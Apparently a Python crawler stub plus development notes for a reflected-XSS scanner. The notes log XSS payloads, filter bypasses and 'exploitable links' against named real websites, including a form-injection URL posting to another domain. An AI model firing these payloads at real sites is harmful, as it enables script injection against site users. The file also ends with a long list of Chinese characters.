
import re
from bs4 import BeautifulSoup
from WebRequest import web_request

def get_source(url):
        Web = web_request(url,'GET')
        source = Web.get_source()
        return source

def get_links(source):
        links = []
        soup = BeautifulSoup(source,features="lxml")
        tags = soup.find_all('a', href=True)
        # tags = tags + soup.find_all('link', href=True)
        for tag in tags:    
            if not str(tag['href']).__contains__('moz.com'):    links.append(tag['href'])
        # print(links)
        return links

def getlinks_fromfile(source):
    exp = re.compile('(?!\d)\w+\.[\w\.\w]+')
    links = exp.findall(source)
    return links

def core_url(data):
        exp = re.compile('https?:\/\/[\w]+?\.?\-?[\w]+\.[\.\w]+')
        core = exp.findall(data)
        # print('Core Url ', core)
        if not core: return ''
        return core

def start():
    files =  open('sample_data/websites.txt', 'r')
    source = files.read()
    links = getlinks_fromfile(source)

    print('working.....')
    newfile = open('sample_data/links.txt', 'a')
    for link in links: 
        newfile.write('https://www.' + str(link) + '\n' )
        print(link)
    print('\n\nDONE')

if __name__ == "__main__":
    # link = 'https://moz.com/top500'
    # source = get_source(link)
    print('{BASEMENT}')
    # start()
    pass
    



"""             
_____________________________________________________________________________________________________________________
==>>    UPDATES Created - DONE

1. Extract Unique GET Params.
2. If 2 forms have same 2 GET Params, then 4 GET URLs will be generated: DONE: later unique GET URLS are extracted
3. Payload Updated = (uvw"xyz'yxz</zxy. DONE
4. Encoding Check for each value of a context. 
    a. Resolved Issue: one value has encoding and others may not have..!!
5. Base Url for all websites. Resolved THE ISSUE of 'http://ifu-institut.at' and 'http://drudgereportarchives.com'
6. Now We Store the 'SUCCESSFUL_ATTACK_URL', 'Context_name and 'Detection' in the EXCEL FIle.. 
7. Created separate folder at Run-time for each WEBSITE, so all of its webpages data goes in that folder. 
8. Unique GET URLs:
    a. If [2] forms have same [2] GET Params, then [4] GET URLs will be generated and then [2] unique GET URLS are extracted
    b. BUT if they have DIFFERENT FORM ACTIONS, then there will be 4 UNIQUE GET URLS.

_____________________________________________________________________________________________________________________
==>>    UPDATES REQUIRED 

1.  script double quotes encapsulation. why it missed.. 
    a. https://www.airbnb.com.br/s/all?refinement_paths[]=/uvw%22xyz%27yxz%3Czxy&query=
    b. \"refinementPaths\":[\"/uvw\\\"xyz'yxz\u003czxy\"],
    c. NOW WHAT ..    

_____________________________________________________________________________________________________________________
==>> RESOLVED ISSUES:

1. data-digital-data has been detected.. [ faz.net] 
2. HTML missing due to Nested <span Tag inside a <span Tag:  SUCCESSFULLY Detected. 
3. Attack Payload Detection:
4. Return Only the Value where XSS is present or there is a Bypass. 

_____________________________________________________________________________________________________________________
^^^ Remaining Issue:

1. script_single_quotes_outside
    re.compile(r'[=:]\s?\'[@\*!~|$_,}+*\\#\'*{*\s^*?\[\]*(*)*\/*.*\w*=:*&*;*\-*%*\d*]*'+ re.escape(attack))
2. This RegExp is Not fit for Script .. [=:] is alright, but [\"\'] is NOT.

_____________________________________________________________________________________________________________________
==>>    FINDINGS:

ISSUE NO. 1: [ Haven't split Tag into its attributes ==>>> I think it is very rarely needed and doesn't make much of a difference ]
1. https://www.burpee.com/search?q=(uvw"xyz'yxz</zxy
2. URL Context: Encoding is present and also absent for different attributes of the TAG e.g: <a> 
 <a class="b-breadcrumbs-keywords_link" href="/search?q=%28uvw%22xyz%27yxz%3C%2Fzxy" title="(uvw&quot;xyz'yxz&lt;/zxy">
3. Now, I think I have to break the tags in parts, in order to check this.
4. In my opinion, We shall give priority to the Non-Encoded and Non-Filtered attribute of the TAG.

------------------------------------------------------------------------------------------
ISSUE NO. 2:
-------------------------------------------------------------------
Confirmed by Ashar as "Edge Cases" for title , span and style Tags
--------------------------------------------------------------------
1. https://www.burpee.com/search?q=(uvw"xyz'yxz</zxy
2. payload <img src=x onerror="alert(1)"> dones not work, it is in the <title> tag.
3. if we first close the </title> TAG , then it is XSSed
4. payload </title><img src=x onerror="alert(1)"> is SUCCESSFUL
------------------------------------------------------------------------------------------

ISSUE NO. 3: Attack Methodology for URL CONTEXT 

1. Does it need any kind of Encoding Analysis..?
2. Or for every webpage we try all of the attacks form Your Chart
3. I'm Not very good with URL-Obfuscation, So, for now I have your payloads from js-fiddle
    a. http://jsfiddle.net/Qv6F4/1/ : <a href="ja&#9;vasc&#10;ript&#58;alert&#40;1&#41;">click</a>
    b. http://jsfiddle.net/Qv6F4/   : <a href="ja&#x00009;vasc&#x0000A;ript&#x0003A;alert&#x00028;1&#x00029;">click</a>

ISSUE NO. 4: [ We'll need this One when crawling websites ]
1. On https://www.crane.com
i.  <a href="/stationery/featured-products">Featured Products</a> 
ii. <a href="/stationery/best-sellers">Best Sellers</a>
2. The href value is merged with base Url to produce a complete link. 
 https://www.crane.com + href
3. So what's the update, are we going to do the same..
        YEAH I THINK WE SHOULD.. ====>> CommoN SensE :)


ISSUE NO. 5:    [Will Update it in the NEXT Versions |  Maybe Header Problems ]
1. https://www.moosejaw.com/content/ann-arbor-shop
2. could not detect all the get params, though webpage has One GET Form with 14 get params..!!
3. Couldn't Collect COMPLETE SOURCE with TOOL 
4. The Request was blocked, redirected to this url.
    https://www.moosejaw.com/block.html?url=L2NvbnRlbnQvYW5uLWFyYm9yLXNob3A/&uuid=e19e1fc0-8173-11ea-9ed7-bd65ae1f2e66&vid=
5. Block ID: e19e1fc0-8173-11ea-9ed7-bd65ae1f2e66

ISSUE 6:    [Will Update it in the NEXT Versions]
1. https://www.rei.com/
2. GET Input NOT captured  Libraries: {requests and urllib failed to load data or access website}
3. It has one GET Param = ['q']

ISSUE NO. 7:    [FIXED and Captured the Values]
https://atasteofkentucky.com/kentucky-derby-2020/
1. </span> Search results for &ldquo;(uvw&quot;xyz&#039;yxz&lt;/zxy&rdquo;</nav>
2. https://atasteofkentucky.com/?s=(uvw%22xyz%27yxz%3C/zxy&post_type=product
HTML NOT detected.. bcoz at both ends it has a closing tag.. Let's fix this.

ISSUE 8 : [FIXED and captured 2 script contexts, Manually verified]
1. https://celticbydesign.com/search?q=(uvw%22xyz%27yxz%3C/zxy
2. script tag missing . Recapture it with the updated RegExp for script


ISSUE 9: [FIXED and Captured 3 script contexts]
1. Check https://www.stevespanglerscience.com
2. https://www.stevespanglerscience.com/?s=(uvw"xyz'yxz</zxy&post_type=
3. Look for 2 or more script contexts... with updated RegExp

Issue 10: [I just wanted to Make sure that for every GET Param [name,value] pairs have correct value]  
1. Manual  => https://www.timberland.co.uk/shop/SearchDisplay?sType=SimpleSearch&catalogId=11159&searchSource=Q&beginIndex=0&storeId=7105&langId=-11&searchTerm=(uvw"xyz'yxz</zxy
2. Tool    => https://www.timberland.co.uk/shop/SearchDisplay?sType=SimpleSearch&catalogId=11159&searchSource=Q&beginIndex=0&storeId=7105&langId=-11&searchTerm=(uvw"xyz'yxz</zxy
[ So Tool-Created URL was SAME as Manual Finding of the URL]

----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------

ISSUE 11:   [ Resolved ]
Unique GET URLs:
    a. If [2] forms have same [2] GET Params, then [4] GET URLs will be generated and then [2] unique GET URLS are extracted
    b. BUT if they have DIFFERENT FORM ACTIONS, then there will be 4 UNIQUE GET URLS.

ISSUE 12: [ Resolved: I updated the regex for script-single-quotes encapsulation to bypass colon : however stop at equal =]
1. https://www.stevespanglerscience.com
2. var woof_current_values = '{"s":"(uvw\\&quot;xyz\\&#039;yxz&lt;\/zxy","post_type":"","woof_text":"(uvw\\&quot;xyz\\&#039;yxz&lt;\/zxy"}';
3. let's say we have ' unescaped, then my RegExp stops at __"s":"__  i.e. r'[=:]\s?\"'
4. so how am I going to evaluate that..?? hmmm...!!

ISSUE 13: [Resolved: Tool Results are Correct | 2 HTML were present, script attack is for < sign ]
1. https://www.scientificamerican.com/
2. No HTML Context was present, but still HTML Attack is thrown
3. https://www.scientificamerican.com/search/?q=%3Cimg%20src=x%20onerror=%22xyz(1)%22%3E
4.  Script attack was thrown, when All the Mitigations are present
5. https://www.scientificamerican.com/search/?q=</script><script>alert(1)</script>
6. "title":"\"\"xyz'<\""},


ISSUE 14:  [Will Update it in the NEXT Versions]
1. https://spo.1sept.ru/spoarchive.php
2. check for GET URLs. Has one GET FORM and 2 hidden inputs

ISSUE 15: [Resolved: Updated regex for the URL Mitigation analysis]
1. https://www.redrivercatalog.com/search.html?addsearch=(uvw"xyz'yxz</zxy
2. Missed the URL Context Attack. As the special chars were NOT escaped.  


---------------------------------------------------------------------------------------------------------------------------
    -------- REMAINING --------
----------------------------------------------------------------------------------------------------------------------------

ISSUE 16:   [Resolved, Now we are not attacking with aatr-single-quotes ]
1. ATTR Attack Url: https://www.datasheet4u.com/search.php?sWord=' onmouseover='alert`1`
2. FINAL OUTPUT: [Detection]
<link rel="canonical" href="/share_search.php?sWord=' onmouseover='alert`1`">
<input type="text" name="sWord" size="30" value="' onmouseover='alert`1`" style="width:300px;height:45px; border:solid 3px #1887DB; font-size:20">
3. The <input tag should not be here as ' is encapsulated with "

ISSUE 17: [Resolved]
1. https://www.wattpad.com/search/?q='; confirm`1`; '&ref=1
2. <script type="text/javascript">
        window.prefetched = {"search.stories.results.'; confirm`1`; '.false.false":{"data":{"total":0,"stories":[],"tags":[]}}};
    </script>
3. Mitigation is done with double quotes outside.. 

ISSUE 18: [ADHOC Risk with multiple RegExp]
1. https://www.wowhead.com/search?q='; confirm`1`; '
2.  <script>
        WH.Track.nonInteractiveEvent('Search', 'Total Results', "'; confirm`1`; '", 0);
        WH.Track.nonInteractiveEvent('Search', 'Database Results', "'; confirm`1`; '", 0);
    </script>
3. Mitigation is done with double quotes outside.. 
4. SAME FOR: 
    a. https://www.nejm.org/search?pageType=search&q='; confirm`1`; '&asug=
    b. https://www.mainichi.jp/search/?&q=&s='; confirm`1`; '
    c. https://www.sephora.fr/recherche?q=' onmouseover='alert`1`


ISSUE 19: [ Ignored due to ADHOC risk]
1. https://www.unicef.de/suche?search=%22xyz%27yxz%3C
2.  <script type="text/javascript">
    $(function() {
	    $.get("/campaign/check/unicef/19892?search=%2522xyz'yxz%253C");
    });
    </script>
3. Single Quotes Mitigation Present, But One Regex can't pick it, Shall we use multiple..??
4. Using multiple regex may become an ADHOC.


ISSUE 20:  [Variety in script tag Expression will create an ADHOC risk .. ]
1. https://www.pullcast.eu/search?product=%22;%20confirm`1`;%20%22
2. $('.filter-text').removeClass('hidden').text('"; CONFIRM`1`; "').css('text-transform','uppercase');
3. filter:'."; confirm`1`; "'});
4. Mitigation of Double Quotes with Single Quotes Outside. 


ISSUE 21:
1. https://www.airbnb.com.br
2. script context.2 has more than 1 occurence of xyz , where one of them has quotes encapsulations and others doesn't.
3. the program returns as mitigation is present in the form of quotes encapsulation. 
4. however it can be like that, e.g; if one of the appearance in the same script tag doesn't have mitigation..? 
5. Right..!! Come to think of it. ..!!

ISSUE 22: [I myself didn't understand the scheme here.. single quotes inside a bracket '[' ..? ]
1. script double quotes encapsulation. why it missed.. 
    a. https://www.airbnb.com.br/s/all?refinement_paths[]=/uvw%22xyz%27yxz%3Czxy&query=
    b. \"refinementPaths\":[\"/uvw\\\"xyz'yxz\u003czxy\"],
    c. NOW WHAT ..

Issue 23:
            SHOULD NOT BE HAPPENING 
1. https://www.vitabiotics.com/pages/search-results-page?q=%22xyz%27%3C
2. https://techprincess.it/?s=%22xyz%27%3C
3. why did program thrown a script single quotes attack 
4. attr double/single attack     https://jobs.berlin.de/?ke=&ws=%22xyz%27%3C
5. attr attack      https://www.telemart.ua/search/?search_que=%22xyz%27%3C

Issue 24 :
1. http://db.etree.org/shnlist.php?artist=&artist_group_key=1&year=/uvw"xyz'yxz<zxy
2. <a href="/shnlist.php?artist=0&year=/uvw\"xyz\'yxz<zxy">
3. The double quotes are breaking the Context, despite the backslash {\"}.. 
    The program treats \" is valid mitigation for the double quotes
    So, keeping in view this case, I am removing {\"} from URL Context as Mitigation. 

 URL ATTACK Methodology:
1. What are the payloads for URL context and on what condition Tool should fire the attacks..

THE LANGUAGE ISSUE: [REGEX]
1. http://tw.gigacircle.com/category.html?group=abc/uvw"xyz'yxz<zxy
A. Website source code in the Browser: 
    <meta name="description" content="瀏覽關於/uvw" xyz'yxz<zxy的分類，挑選您最愛看的內容">
    <meta name="keywords" content="/uvw" xyz'yxz<zxy,分類,類別" />
 Solution: added japanese & chinese character sequence
    Captured with additional regex: [\u4e00-\u9fff\u3000-\u303f\u3040-\u309f\u30a0-\u30ff\uff00-\uff9f\u4e00-\u9faf\uff00-\uffff]
B. However, the reflections in downloaded source code of website with requests library is:
    <meta name="description" content="çè¦½éæ¼abc/uvw" xyz'yxz<zxy çåé¡¼æé¸æ¨ææçå§å®¹">
    <meta name="keywords" content="abc/uvw" xyz'yxz<zxy,åé¡¡¥" />
 Solution:
    These characters are different:
Wikipedia: 
The letter Å (å in lower case) represents various (although often very similar) sounds in several languages.
 It is a separate letter in Swedish, Danish, Norwegian, Finnish, North Frisian, Walloon, Chamorro, Lule Sami,
  Skolt Sami, Southern Sami, and Greenlandic alphabets.     
Conclusion
  Still couldn't find any regex or help for these...

* Regex to detect all of the chinese letters:
1.  https://regex101.com/r/dXsTwN/1
----------------------------------------------------------------------------------------------------------------------------
        ----- FUTURE WORK -----
----------------------------------------------------------------------------------------------------------------------------

Task 1:
1. https://www.nejm.org/search?pageType=search&q=&asug=/uvw"xyz'yxz<zxy
2. script tag has 2 occurence of payload, first with url encoding and second with double quote escaping and encapsulation. 
3. We can Use Regex to split these 2 occurences and analyze them separately.. 


----------------------------------------------------------------------------------------------------------------------------
        -----  ATTACK CASES -----
----------------------------------------------------------------------------------------------------------------------------

Case 1:
1. https://www.borsheims.com/
2. Payload: 
</span></h1><div style="background-color:lightblue;"><h1>DrudgeReport Form</h1><form action="//www.drudgereportArchives.com/dsp/search.htm" method="GET" name="searchForm" target="_top" style="margin:0px;padding:0px;"> 			 			<input type="Text" class="dra" name="searchFor" size="20" maxlength="500" value=""> 			<input type="Submit" value="Search Archives" class="dra"> 		</form></div><h1><span><!--
3. Exploitable Link with Paylaod: 
https://www.borsheims.com/product-search?Search=%3C%2Fspan%3E%3C%2Fh1%3E%3Cdiv+style%3D%22background-color%3Alightblue%3B%22%3E%3Ch1%3EDrudgeReport+Form%3C%2Fh1%3E%3Cform+action%3D%22%2F%2Fwww.drudgereportArchives.com%2Fdsp%2Fsearch.htm%22+method%3D%22GET%22+name%3D%22searchForm%22+target%3D%22_top%22+style%3D%22margin%3A0px%3Bpadding%3A0px%3B%22%3E+%09%09%09+%09%09%09%3Cinput+type%3D%22Text%22+class%3D%22dra%22+name%3D%22searchFor%22+size%3D%2220%22+maxlength%3D%22500%22+value%3D%22%22%3E+%09%09%09%3Cinput+type%3D%22Submit%22+value%3D%22Search+Archives%22+class%3D%22dra%22%3E+%09%09%3C%2Fform%3E%3C%2Fdiv%3E%3Ch1%3E%3Cspan%3E%3C%21--

Case 2:
1. Exploitable Link:
https://www.tatsoul.com/supplies/index.php?main_page=advanced_search&search_in_description=1&keyword=xyz%27;%20conf%3Cirm(1);%20%27&inc_subcat=0&sort=20a
2. filtering alert, prompt, confirm and also <  So I used conf<irm :)

Case 3:
1. Exploitable Link:
https://www.petdoors.com/catalogsearch/result?q=%22/%3Exyz%3Cinput%20type=%22submit%22%20onmouseover=%22alert(1)%22/%3E%3C!--
2. filtering alert, confirm, prompt script in upper and lower case mixed.. 
3. 


content='{"keyword":"  '"}><input%20type="submit"%20onmouseover="alert(1)">//  "}'/>

"""
"""

https://list.tmall.com/search_product.htm?q=%22xyz&type=p&spm=a220m.1000858.a2227oh.d100&from=.list.pc_1_searchbutton
https://www.sogou.com/tx?hdq=sogou-wsse-3f7bcd0b3ea82268&ie=utf-8&query=newzone
https://mp.weixin.qq.com/s?src=3&timestamp=1589628993&ver=1&signature=az-e2gCzl1q7yCzsvOkRCJypGTZhF80phDfqBZCInQAFeqMVc4wQ2VbFLFtZqB6CdjdYa1KF9di5sbWViELTx6fJ4GVWqS45y*gEVRWR7Vu5U2HuxwUvWlX7tnEKr-uEbl0V95FqoV0vruxGirCnKzPgxcxji0xfz49r0fVkKrc=
http://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=xyz&fenlei=256&rsv_pq=fa06ddd00004840d&rsv_t=fbdd9WNuUOiqIQKKkBcR6lfGDpYV1JPYybSIEeS7Kqh3GNVgXsNzrFRfGtI&rqlang=cn&rsv_enter=1&rsv_dl=tb&rsv_sug3=4&rsv_sug2=0&rsv_btype=i&inputT=535&rsv_sug4=1204
https://www.sohu.com/
https://pages.tmall.com/wow/a/act/tmall/tmc/26646/wupr?spm=a2240.7829288.0.0.44c34fe50dbvxn&pos=1&wh_pid=main-192807&acm=lb-zebra-153802-761482.1003.2.7829925&scm=1003.2.lb-zebra-153802-761482.ITEM_1590379293744_7829925
https://list.tmall.com/search_product.htm?q=xtz&type=p&vmarket=&spm=a211oj.0.a2227oh.d100&from=..pc_1_searchbutton
https://so.com/s?q=xtz&src=360portal&_re=0
https://world.taobao.com/
https://search.jd.com/Search?keyword=xzt&enc=utf-8&gp=2&wq=xzt&pvid=c774e1cdcd23496e8e185ab578e800c6
http://www.sina.com.cn/mid/search.shtml?range=all&c=news&q=xzy&from=home&ie=utf-8
https://www.zhanqi.tv/search?q=x
https://so.csdn.net/so/search/s.do?q=x&t=&u=
https://s.weibo.com/weibo/xz?topnav=1&wvr=6&b=1
http://17ok.com/
https://search.bilibili.com/all?keyword=new&from_source=nav_search_new
http://so.jrj.com.cn/cse/search?q=&s=5981575158355482147&nsid=1
https://www.google.com.hk/webhp?hl=hi&sourceid=cnhp&gws_rd=ssl
https://www.yy.com/93479716/93479716?tempId=16777299999
https://search.gome.com.cn/search?question=new&searchType=goods&search_mode=normal&reWrite=true&instock=1
https://www.6.cn/search.php?type=use&key=new
https://zzk.cnblogs.com/s?t=b&w=nerw
http://www.chinaso.com/search/pagesearch.htm?q=&site=eastday.com&search_scope=insite
https://so.iqiyi.com/so/q_new?source=input&sr=161302371559
http://s.rednet.cn/?scope=1&title=0&q=new
https://www.alibabacloud.com/s?k=new



"""
""" Chinese Character (all of them)
一
丁
七
万
丈
三
上
下
不
与
丐
丑
专
且
世
丘
丙
业
丛
东
丝
丢
两
严
丧
个
中
丰
串
临
丸
丹
为
主
丽
举
乃
久
么
义
之
乌
乍
乎
乏
乐
乒
乓
乔
乖
乘
乙
九
乞
也
习
乡
书
买
乱
乳
乾
了
予
争
事
二
于
亏
云
互
五
井
亚
些
亡
交
亥
亦
产
亩
享
京
亭
亮
亲
人
亿
什
仁
仅
仆
仇
今
介
仍
从
仑
仓
仔
他
仗
付
仙
代
令
以
仪
们
仰
仲
件
价
任
份
仿
企
伊
伍
伏
伐
休
众
优
伙
会
伞
伟
传
伤
伦
伪
伯
估
伴
伶
伸
伺
似
佃
但
位
低
住
佑
体
何
余
佛
作
你
佣
佩
佳
使
侄
侈
例
侍
供
依
侠
侣
侥
侦
侧
侨
侮
侯
侵
便
促
俄
俊
俏
俐
俗
俘
保
信
俩
俭
修
俯
俱
俺
倍
倒
倔
倘
候
倚
借
倡
倦
债
值
倾
假
偎
偏
做
停
健
偶
偷
偿
傀
傅
傍
储
催
傲
傻
像
僚
僧
僵
僻
儒
儡
儿
允
元
兄
充
兆
先
光
克
免
兑
兔
党
兜
兢
入
全
八
公
六
兰
共
关
兴
兵
其
具
典
养
兼
兽
冀
内
冈
册
再
冒
冕
冗
写
军
农
冠
冤
冬
冯
冰
冲
决
况
冶
冷
冻
净
凄
准
凉
凌
减
凑
凛
凝
几
凡
凤
凫
凭
凯
凰
凳
凶
凸
凹
出
击
函
凿
刀
刁
刃
分
切
刊
刑
划
列
刘
则
刚
创
初
删
判
刨
利
别
刮
到
制
刷
券
刹
刺
刻
刽
剂
剃
削
前
剑
剔
剖
剥
剧
剩
剪
副
割
剿
劈
力
劝
办
功
加
务
劣
动
助
努
劫
励
劲
劳
势
勃
勇
勉
勋
勒
勘
募
勤
勺
勾
勿
匀
包
匆
匈
匕
化
北
匙
匠
匣
匪
匹
区
医
匾
匿
十
千
升
午
半
华
协
卑
卒
卓
单
卖
南
博
卜
占
卡
卢
卤
卦
卧
卫
印
危
即
却
卵
卷
卸
卿
厂
厅
历
厉
压
厌
厕
厘
厚
原
厢
厦
厨
去
县
叁
参
又
叉
及
友
双
反
发
叔
取
受
变
叙
叛
叠
口
古
句
另
叨
只
叫
召
叭
叮
可
台
史
右
叶
号
司
叹
叼
叽
吁
吃
各
吆
合
吉
吊
同
名
后
吏
吐
向
吓
吕
吗
君
吝
吞
吟
吠
否
吧
吨
吩
含
听
吭
吮
启
吱
吴
吵
吸
吹
吻
吼
呀
呆
呈
告
呐
呕
员
呛
呜
呢
周
味
呵
呻
呼
命
咆
和
咏
咐
咒
咕
咖
咙
咧
咨
咪
咬
咱
咳
咸
咽
哀
品
哄
哆
哈
响
哎
哑
哗
哟
哥
哨
哩
哪
哭
哮
哲
哺
哼
唁
唆
唇
唉
唐
唠
唤
唧
唬
售
唯
唱
唾
啃
啄
商
啊
啡
啤
啥
啦
啰
啸
啼
喂
善
喇
喉
喊
喘
喜
喝
喧
喳
喷
喻
嗅
嗓
嗜
嗡
嗤
嗦
嗽
嘀
嘁
嘉
嘱
嘲
嘴
嘶
嘹
嘿
器
噩
噪
嚎
嚣
嚷
嚼
囊
囚
四
回
因
团
囤
园
困
囱
围
固
国
图
圃
圆
圈
土
圣
在
地
场
圾
址
均
坊
坎
坏
坐
坑
块
坚
坛
坝
坞
坟
坠
坡
坤
坦
坪
坯
坷
垂
垃
垄
型
垒
垛
垢
垦
垫
垮
埂
埃
埋
城
域
埠
培
基
堂
堆
堕
堡
堤
堪
堰
堵
塌
塑
塔
塘
塞
填
境
墅
墓
墙
增
墨
墩
壁
壕
壤
士
壮
声
壳
壶
壹
处
备
复
夏
夕
外
多
夜
够
大
天
太
夫
夭
央
夯
失
头
夷
夸
夹
夺
奄
奇
奈
奉
奋
奏
契
奔
奕
奖
套
奠
奢
奥
女
奴
奶
奸
她
好
如
妄
妆
妇
妈
妒
妓
妖
妙
妥
妨
妹
妻
姆
姊
始
姐
姑
姓
委
姚
姜
姥
姨
姻
姿
威
娃
娄
娇
娘
娜
娩
娱
娶
婆
婉
婚
婴
婶
婿
媒
媚
媳
嫁
嫂
嫉
嫌
嫡
嫩
嬉
子
孔
孕
字
存
孙
孝
孟
季
孤
学
孩
孵
孽
宁
它
宅
宇
守
安
宋
完
宏
宗
官
宙
定
宛
宜
宝
实
宠
审
客
宣
室
宦
宪
宫
宰
害
宴
宵
家
容
宽
宾
宿
寂
寄
密
寇
富
寒
寓
寝
寞
察
寡
寥
寨
寸
对
寺
寻
导
寿
封
射
将
尉
尊
小
少
尔
尖
尘
尚
尝
尤
就
尸
尺
尼
尽
尾
尿
局
屁
层
居
屈
屉
届
屋
屎
屏
屑
展
属
屠
屡
履
屯
山
屹
屿
岁
岂
岔
岖
岗
岛
岩
岭
岳
岸
峡
峦
峭
峰
峻
崇
崎
崔
崖
崩
崭
嵌
巍
川
州
巡
巢
工
左
巧
巨
巩
巫
差
己
已
巴
巷
巾
币
市
布
帅
帆
师
希
帐
帕
帖
帘
帚
帜
帝
带
席
帮
常
帽
幅
幌
幔
幕
幢
干
平
年
并
幸
幻
幼
幽
广
庄
庆
庇
床
序
庐
库
应
底
店
庙
府
庞
废
度
座
庭
庵
庶
康
庸
廉
廊
廓
延
廷
建
开
异
弃
弄
弊
式
弓
引
弛
弟
张
弥
弦
弧
弯
弱
弹
强
归
当
录
形
彤
彩
彪
彬
彭
彰
影
役
彻
彼
往
征
径
待
很
徊
律
徐
徒
得
徘
徙
御
循
微
德
徽
心
必
忆
忌
忍
志
忘
忙
忠
忧
快
忱
念
忽
忿
怀
态
怎
怒
怔
怕
怖
怜
思
怠
急
性
怨
怪
怯
总
恃
恋
恍
恐
恒
恕
恢
恤
恨
恩
恬
恭
息
恰
恳
恶
恼
悄
悉
悍
悔
悟
悠
患
悦
您
悬
悯
悲
悴
悼
情
惊
惋
惑
惕
惜
惠
惦
惧
惨
惩
惫
惭
惯
惰
想
惶
惹
愁
愈
愉
意
愕
愚
感
愤
愧
愿
慈
慌
慎
慕
慢
慧
慨
慰
慷
憋
憎
憔
憨
憾
懂
懈
懊
懒
懦
戈
戏
成
我
戒
或
战
戚
截
戳
戴
户
房
所
扁
扇
手
才
扎
扑
扒
打
扔
托
扛
扣
执
扩
扫
扬
扭
扮
扯
扰
扳
扶
批
扼
找
承
技
抄
把
抑
抒
抓
投
抖
抗
折
抚
抛
抠
抡
抢
护
报
披
抬
抱
抵
抹
押
抽
拂
拄
担
拆
拇
拉
拌
拍
拐
拒
拓
拔
拖
拗
拘
拙
招
拜
拟
拢
拣
拥
拦
拧
拨
择
括
拭
拯
拱
拳
拴
拷
拼
拾
拿
持
挂
指
按
挎
挑
挖
挚
挟
挠
挡
挣
挤
挥
挨
挪
挫
振
挺
挽
捂
捅
捆
捉
捌
捍
捎
捏
捐
捕
捞
损
捡
换
捣
捧
据
捶
捷
捺
捻
掀
掂
授
掉
掌
掏
掐
排
掖
掘
掠
探
接
控
推
掩
措
掰
掷
掸
掺
揉
揍
描
提
插
揖
握
揣
揩
揪
揭
援
揽
搀
搁
搂
搅
搏
搓
搔
搜
搞
搪
搬
搭
携
摄
摆
摇
摊
摔
摘
摧
摩
摸
摹
撇
撑
撒
撕
撞
撤
撩
撬
播
撮
撰
撵
撼
擂
擅
操
擎
擒
擦
攀
攒
攘
支
收
改
攻
放
政
故
效
敌
敏
救
教
敛
敞
敢
散
敦
敬
数
敲
整
敷
文
斋
斑
斗
料
斜
斟
斤
斥
斧
斩
断
斯
新
方
施
旁
旅
旋
族
旗
无
既
日
旦
旧
旨
早
旬
旭
旱
时
旷
旺
昂
昆
昌
明
昏
易
昔
昙
星
映
春
昧
昨
昭
是
昵
昼
显
晃
晋
晌
晒
晓
晕
晚
晤
晦
晨
普
景
晰
晴
晶
智
晾
暂
暇
暑
暖
暗
暮
暴
曙
曲
更
曹
曼
曾
替
最
月
有
朋
服
朗
望
朝
期
朦
木
未
末
本
术
朱
朴
朵
机
朽
杀
杂
权
杆
杈
杉
李
杏
材
村
杖
杜
束
杠
条
来
杨
杭
杯
杰
松
板
极
构
枉
析
枕
林
枚
果
枝
枢
枣
枪
枫
枯
架
枷
柄
柏
某
柑
柒
染
柔
柜
柠
查
柬
柱
柳
柴
柿
栅
标
栈
栋
栏
树
栓
栖
栗
校
株
样
核
根
格
栽
桂
桃
桅
框
案
桌
桐
桑
档
桥
桦
桨
桩
桶
梁
梅
梆
梗
梢
梦
梧
梨
梭
梯
械
梳
检
棉
棋
棍
棒
棕
棘
棚
棠
森
棱
棵
棺
椅
植
椎
椒
椭
椰
椿
楔
楚
楞
楣
楷
楼
概
榄
榆
榔
榕
榛
榜
榨
榴
槐
槽
樊
樟
模
横
樱
橄
橘
橙
橡
橱
檀
檐
檩
檬
欠
次
欢
欣
欧
欲
欺
款
歇
歉
歌
止
正
此
步
武
歧
歪
歹
死
歼
殃
殉
殊
残
殖
殴
段
殷
殿
毁
毅
母
每
毒
比
毕
毙
毛
毡
毫
毯
氏
民
氓
气
氛
氢
氧
氨
氮
氯
水
永
汁
求
汇
汉
汗
汛
汞
江
池
污
汤
汪
汰
汹
汽
沃
沈
沉
沐
沙
沛
沟
没
沥
沦
沧
沪
沫
沮
河
沸
油
治
沼
沽
沾
沿
泄
泉
泊
泌
法
泛
泞
泡
波
泣
泥
注
泪
泰
泳
泵
泻
泼
泽
洁
洋
洒
洗
洛
洞
津
洪
洲
活
洼
洽
派
流
浅
浆
浇
浊
测
济
浑
浓
浙
浦
浩
浪
浮
浴
海
浸
涂
消
涉
涌
涎
涕
涛
涝
涡
涣
涤
润
涧
涨
涩
涮
涯
液
涵
淀
淆
淋
淌
淑
淘
淡
淤
淫
淮
深
淳
混
淹
添
清
渊
渐
渔
渗
渠
渡
渣
渤
温
港
渴
游
渺
湃
湖
湘
湾
湿
溃
溅
溉
源
溜
溢
溪
溯
溶
溺
滋
滑
滓
滔
滚
滞
满
滤
滥
滨
滩
滴
漂
漆
漏
漓
演
漠
漩
漫
漱
漾
潘
潜
潦
潭
潮
澄
澈
澎
澜
澡
澳
激
濒
瀑
灌
火
灭
灯
灰
灵
灶
灸
灼
灾
灿
炉
炊
炎
炒
炕
炫
炬
炭
炮
炸
点
炼
烁
烂
烈
烘
烙
烛
烟
烤
烦
烧
烫
热
烹
焊
焕
焙
焚
焦
焰
然
煌
煎
煞
煤
照
煮
熄
熊
熏
熔
熙
熟
熬
燃
燎
燕
燥
爆
爪
爬
爱
爵
父
爷
爸
爹
爽
片
版
牌
牍
牙
牛
牡
牢
牧
物
牲
牵
特
牺
犀
犁
犬
犯
状
犹
狂
狈
狐
狗
狞
狠
狡
独
狭
狮
狰
狱
狸
狼
猎
猖
猛
猜
猩
猪
猫
猬
献
猴
猾
猿
玄
率
玉
王
玖
玛
玩
玫
环
现
玲
玷
玻
珊
珍
珠
班
球
琅
理
琉
琐
琢
琳
琴
琼
瑞
瑟
瑰
璃
璧
瓜
瓢
瓣
瓤
瓦
瓮
瓶
瓷
甘
甚
甜
生
甥
用
甩
甫
田
由
甲
申
电
男
甸
画
畅
界
畏
畔
留
畜
略
畦
番
畴
畸
疆
疏
疑
疗
疙
疚
疟
疤
疫
疮
疯
疲
疹
疼
疾
病
症
痊
痒
痕
痘
痛
痢
痪
痰
痴
痹
瘟
瘤
瘦
瘩
瘪
瘫
瘸
瘾
癌
癞
癣
登
白
百
皂
的
皆
皇
皮
皱
皿
盅
盆
盈
益
盏
盐
监
盒
盔
盖
盗
盘
盛
盟
目
盯
盲
直
相
盹
盼
盾
省
眉
看
真
眠
眨
眯
眶
眷
眼
着
